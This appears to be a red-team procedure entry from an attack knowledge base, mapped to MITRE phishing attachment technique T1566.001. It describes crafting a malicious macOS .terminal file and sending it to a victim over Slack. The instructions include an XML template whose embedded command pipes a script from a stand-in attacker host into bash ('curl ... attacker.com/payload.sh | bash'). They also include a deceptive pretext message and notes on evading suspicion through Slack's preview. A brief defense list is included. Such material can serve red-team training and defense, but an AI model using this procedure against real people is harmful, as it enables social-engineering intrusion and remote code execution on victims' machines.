---
id: proc-uuid-1
tags:
  - slack
  - file-delivery
  - phishing-attachment
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - macOS
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[T1566.001]]'
updated_at: '2025-12-14T17:24:08.131Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.001]]'
---
# Send-Malicious-Terminal-File-via-Slack

## Summary

This procedure involves crafting and sending a malicious .terminal file through Slack to a victim, leveraging Slack's file preview to disguise the executable nature and set up for subsequent execution.

## Description

In the attack scenario, the attacker creates a .terminal file—an XML-based format used by macOS Terminal to store window configurations and commands. The file embeds arbitrary shell commands within its <command> tag. When sent via Slack for macOS (direct download version), the file previews as harmless text or XML, avoiding suspicion. This step requires access to a shared Slack workspace and relies on social engineering to encourage the victim to interact with the file. Prerequisites include having the Slack app installed and knowledge of basic XML structure for .terminal files.

## Requirements

1. Access to a Slack workspace shared with the target victim
2. macOS environment to craft the .terminal file (or any system with a text editor)
3. Basic understanding of shell commands for payload embedding

## Defense

Defensive measures and detection strategies:

- Train users to avoid opening unexpected file attachments in chat apps
- Enable Slack's file download warnings or restrict file types in workspace settings
- Monitor for anomalous file uploads in Slack audit logs

## Objectives

1. Deliver the malicious payload to the victim without raising alarms during transmission
2. Position the file for easy access via Shift+Click or download
3. Maintain stealth by exploiting Slack's preview mechanism

## Instructions

### Step 1: Craft the Malicious .terminal File

**Context**: Create the file with embedded shell commands to ensure execution upon opening.

Use a text editor to generate the XML structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CommandAndArgArray</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>malicious_command_here; e.g., curl -s http://attacker.com/payload.sh | bash</string>
    </array>
    <key>Label</key>
    <string>Terminal</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>malicious_command_here</string>
    </array>
    <key>WorkingDirectory</key>
    <string>/</string>
</dict>
</plist>
```

> Save as filename.terminal. Replace 'malicious_command_here' with the desired shell payload, such as downloading and executing a remote script.

### Step 2: Upload and Send via Slack

**Context**: Transmit the file to the victim in a way that encourages opening.

In Slack, drag-and-drop or use the file upload feature to send the .terminal file in a direct message or channel. Accompany with a pretext like "Check this config file for the project."

> The file will preview as XML/text, hiding its executable intent.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[T1566.001]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[slack]]
- [[file-delivery]]
